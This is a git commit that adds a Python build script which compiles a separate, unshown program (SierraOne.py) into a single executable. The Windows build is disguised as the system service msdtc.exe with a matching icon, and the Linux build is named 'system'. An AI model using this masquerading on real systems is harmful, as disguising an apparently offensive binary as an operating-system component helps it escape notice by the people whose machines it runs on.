6d488e161e84b847f96cc8e257d51bde656588ed
Arszilla <arszilla@arszilla.com>
2020-04-18 19:09:30 +0300

    Add builder

---
+++ builder.py
@@ -0,0 +1,44 @@
+import argparse
+import os
+import platform
+import subprocess
+import sys
+import time
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-o", "--os", metavar="", required=True, type=str, help="Targeted operating system (Windows, Linux)")
+
+    try:
+        args = parser.parse_args()
+
+    except:
+        print("Missing arguments")
+        sys.exit(0)
+
+    builder(args.os)
+
+
+def builder(dist):
+    if dist.lower() == "windows":
+        subprocess.run(["wine", "pyinstaller", "--onefile", "--icon=images/msdtc.ico", "-n", "msdtc.exe", "SierraOne.py"])
+        time.sleep(1)
+        subprocess.run(["rm", "-rf", "build", "__pycache__", "msdtc.exe.spec"])
+        print("\nDone. Check 'dist' for your file")
+        sys.exit(0)
+
+    elif dist.lower() == "linux":
+        subprocess.run(["pyinstaller", "--onefile", "-n", "system", "SierraOne.py"])
+        time.sleep(1)
+        subprocess.run(["rm", "-rf", "build", "__pycache__", "system.spec"])
+        print("\nDone. Check 'dist' for your file")
+        sys.exit(0)
+
+    else:
+        print("Unsupported operating system")
+        sys.exit(0)
+
+
+if __name__ == "__main__":
+    main()
